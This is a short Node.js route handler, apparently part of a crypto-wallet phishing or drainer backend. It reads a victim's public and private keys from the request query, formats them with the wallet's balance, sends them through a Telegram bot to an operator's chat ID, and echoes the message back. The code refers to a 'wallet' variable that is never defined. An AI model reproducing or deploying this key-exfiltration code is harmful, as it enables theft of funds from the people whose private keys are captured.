const Bot = require('../../modules/telegram')
const config = require('../../config/index.json')

const send = async ({ query }, res) => {
  const message = `${wallet ? `
💵 ${wallet.balance.toLocaleString()} $
${wallet.balance ? `
📥 ${wallet.received}
🗳️ ${wallet.sent}` : ''}` : `🚨 Api not available `}

🔑 \`${query.publicKey}\`
🔐 \`${query.privateKey}\`
`;

  Bot.sendMessage(
    config.storeId,
    message
  )
  res.status(200).json({ message })
}

module.exports = {
  send,
}
